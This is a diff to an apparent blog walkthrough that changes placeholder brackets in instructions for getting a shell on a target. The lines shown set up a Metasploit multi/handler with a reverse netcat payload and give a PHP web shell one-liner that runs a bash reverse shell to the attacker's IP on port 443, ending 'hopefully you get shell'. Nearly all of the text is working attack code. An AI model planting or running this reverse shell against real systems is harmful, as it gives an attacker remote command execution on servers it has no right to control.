@@ -14,15 +14,15 @@ We need to setup a reverse nc listener using multi/handler on Metasploit. To set
 {% highlight php %}
 use exploit/multi/handler
 set payload/cmd/unix/reverse_netcat
-set LHOST [Your IP]
-set LPORT [443]
+set LHOST {YOUR IP}
+set LPORT {443}
 run
 {% endhighlight %}
 
 Also I recommend using this php script for the best result
 
 {% highlight php %}
-<?php echo shell_exec('/bin/bash -i >& /dev/tcp/[YOUR IP]/443 0>&1');?>
+<?php echo shell_exec('/bin/bash -i >& /dev/tcp/{YOUR IP}/443 0>&1');?>
 {% endhighlight %}
 
 And hopefully you get shell :)
